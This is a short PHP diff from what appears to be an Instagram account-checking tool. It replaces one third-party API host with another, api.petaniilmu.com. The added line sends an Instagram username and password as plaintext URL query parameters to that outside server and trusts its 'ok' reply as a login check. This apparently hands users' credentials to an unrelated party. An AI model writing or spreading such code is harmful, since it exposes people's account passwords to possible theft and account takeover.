@@ -19,7 +19,7 @@ function curl($url, $var = null) {
       curl_close($curl);
       return $result;
   }
-$curl = file_get_contents("https://idsystem404.000webhostapp.com/api/api-cekinfoinstagram.php?username=".$u."&password=".$p);
+$curl = file_get_contents("https://api.petaniilmu.com/api/api-cekinfoinstagram.php?username=".$u."&password=".$p);
 $login = json_decode($curl);
 if ($login->status == "ok"){
       if(empty($info->user->is_verified)){
